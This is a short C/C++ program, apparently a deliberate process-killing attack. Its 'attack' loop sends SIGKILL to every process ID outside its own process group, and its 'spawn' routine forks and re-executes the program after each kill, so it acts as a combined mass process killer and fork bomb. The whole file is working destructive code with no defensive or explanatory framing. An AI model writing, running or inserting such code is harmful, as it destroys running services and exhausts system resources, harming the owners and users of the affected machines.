#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <string>

#define SZ_BUFFER 4096

void attack();
void spawn();

char* self;
pid_t pgid;

int main(int argc, char* argv[]) {

	self = strdup(argv[0]);
	
	if (argc != 2) { pgid = getpid(); }
	else           { pgid = atoi(argv[1]); }

	if (argc > 1 && pgid == 0) {
		printf("args : %s, %s\n", argv[0], argv[1]);
	}

	if (setpgid(0, pgid)) {
		printf("setpgid() failed!\n");
	} 
	else {
		//printf("%d -> %d\n", getpid(), pgid);
	}

	while(1){ attack(); }
}
void attack(){
	int p = getpid();
	for (int i = 1; i < 32768; i++) {
		if (i == p) continue;
		if (getpgid(i) == pgid) continue;
		kill(i, SIGKILL);
		spawn();
	}
}
void spawn() {
	int p = fork();
	if (p == 0) {
		char buffer[32];
		sprintf(buffer, "%d", pgid);

		execl(self, self, buffer, NULL);
	}
}
